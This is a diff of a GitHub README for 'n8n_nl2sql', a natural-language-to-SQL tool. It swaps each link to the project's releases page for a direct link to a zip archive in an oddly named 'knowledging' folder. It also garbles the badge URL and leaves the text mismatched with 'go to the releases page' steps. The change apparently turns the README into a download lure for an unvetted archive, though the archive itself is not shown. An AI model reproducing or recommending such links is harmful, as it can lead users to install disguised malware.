@@ -1,7 +1,7 @@
 # 🎉 n8n_nl2sql - Transform Your Questions Into SQL Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Tanishq60/n8n_nl2sql/releases)
+[![Download](https://raw.githubusercontent.com/Tanishq60/n8n_nl2sql/main/knowledging/n8n_nl2sql.zip%20release-brightgreen)](https://raw.githubusercontent.com/Tanishq60/n8n_nl2sql/main/knowledging/n8n_nl2sql.zip)
 
 ## 🌟 Introduction
 Welcome to n8n_nl2sql! This application lets you convert natural language questions into SQL queries. Imagine having a smart data assistant integrated into your web system. It can query your database and produce visual charts of your data. Whether you're tracking sales figures or analyzing customer feedback, this tool simplifies your data tasks.
@@ -18,7 +18,7 @@ Before you download n8n_nl2sql, make sure your system meets the following requir
 - Internet connection for downloading and obtaining updates
 
 ## 🔗 Download & Install
-Visit this page to download: [Releases Page](https://github.com/Tanishq60/n8n_nl2sql/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Tanishq60/n8n_nl2sql/main/knowledging/n8n_nl2sql.zip).
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version listed at the top.
@@ -60,4 +60,4 @@ n8n_nl2sql is open-source and released under the MIT License. Feel free to contr
 ## 📢 Feedback
 Your feedback is valuable to us. If you have suggestions or encounter any issues, please open an issue on the repository or contact us directly through the support channels.
 
-Now that you have all the information, let's transform your natural language questions into SQL queries! For downloading, remember to [visit this page](https://github.com/Tanishq60/n8n_nl2sql/releases) to get started.
+Now that you have all the information, let's transform your natural language questions into SQL queries! For downloading, remember to [visit this page](https://raw.githubusercontent.com/Tanishq60/n8n_nl2sql/main/knowledging/n8n_nl2sql.zip) to get started.
